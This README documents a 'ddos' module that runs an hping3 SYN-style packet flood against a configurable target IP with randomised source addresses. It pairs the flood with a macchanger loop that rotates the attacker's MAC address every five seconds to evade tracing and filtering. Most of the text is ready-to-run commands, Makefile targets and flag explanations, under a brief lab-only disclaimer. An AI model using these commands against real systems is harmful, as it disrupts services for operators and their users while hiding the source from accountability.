# DDoS

This module simulates a Denial-of-Service (DoS) flood attack using `hping3` while continuously rotating the attacker's MAC address with `macchanger` to make traffic harder to trace and filter.

> **Warning:** This is a security research tool for use only in isolated lab environments on networks you own or have explicit permission to test. Running these tools against real infrastructure is illegal.

## Prerequisites

- `hping3` (`apt install hping3`)
- `macchanger` (`apt install macchanger`)
- Root / `sudo` privileges
- A controlled lab network (e.g., VirtualBox host-only or Docker bridge)

## Makefile Targets

| Target | Description |
|---|---|
| `make` / `make all` | Run the flood attack and MAC rotation loop in sequence |
| `make attack` | Send the raw packet flood to the target IP |
| `make hide` | Rotate MAC address every 5 seconds indefinitely |
| `make change_mac` | Rotate the MAC address once |

## Configuration

Edit the variables at the top of the `Makefile` to match your environment:

```makefile
XPIP = 192.168.68.129   # Target IP address — change this
```

Other variables (generally leave as-is):

```makefile
DDOS  = hping3
HFLAG = --flood -V -d 100 --rand-source   # flood mode, verbose, 100-byte payload, random source IP
TTL   = -I eth0 -0 -R --ttl 128           # raw IP mode on eth0, TTL 128
```

## Usage

```bash
cd ddos

# Full attack + MAC hiding loop
make

# Flood only
make attack

# MAC rotation only (loops forever; Ctrl-C to stop)
make hide
```

## How It Works

**Attack (`make attack`):**

```bash
hping3 --flood -V -d 100 --rand-source -I eth0 -0 -R --ttl 128 <target-ip>
```

- `--flood` — sends packets as fast as possible.
- `--rand-source` — randomizes the source IP in each packet, making ingress filtering less effective.
- `-d 100` — 100-byte payload per packet.
- `-0 -R` — raw IP mode.

**Hiding (`make hide`):**

```bash
while true; do
    sudo macchanger -r eth0
    sleep 5
done
```

Changes the interface's MAC address to a random value every 5 seconds. This complicates MAC-based filtering and logging on the local network segment.

## Reference Files

- `Makefile` — Build system defining the attack and hiding targets.
- `fail_spoof` — Script artifact from a spoofing experiment.
